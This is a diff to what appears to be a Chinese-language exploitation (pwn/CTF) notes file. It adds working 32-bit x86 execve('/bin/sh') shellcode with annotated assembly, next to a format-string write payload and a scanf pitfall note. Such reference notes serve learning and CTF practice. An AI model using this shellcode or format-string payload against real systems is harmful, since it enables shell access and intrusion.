@@ -57,8 +57,25 @@ output=p32(addr)+'a'*4+'%10$n'
 
 # scanf
 如果`scanf`没加`&`的话，程序会默认从栈中读取`4`个字节的数据当做`scanf`取的地址
+
+# execve
+```python
+# execve ("/bin/sh") 
+# xor ecx, ecx
+# mul ecx
+# push ecx
+# push 0x68732f2f   ;; hs//
+# push 0x6e69622f   ;; nib/
+# mov ebx, esp
+# mov al, 11
+# int 0x80
+
+shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
+shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
+shellcode += "\x0b\xcd\x80"
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjA3NDcxNDcxLC0xMjkyNTQ0NTk3LDEzMz
-M3ODYyNjUsLTE3OTY3NjY5NzEsNDQyOTQxMDc5LDEwMTgzMjEy
-NjhdfQ==
+eyJoaXN0b3J5IjpbLTIwOTAxMzg3NzIsLTEyOTI1NDQ1OTcsMT
+MzMzc4NjI2NSwtMTc5Njc2Njk3MSw0NDI5NDEwNzksMTAxODMy
+MTI2OF19
 -->
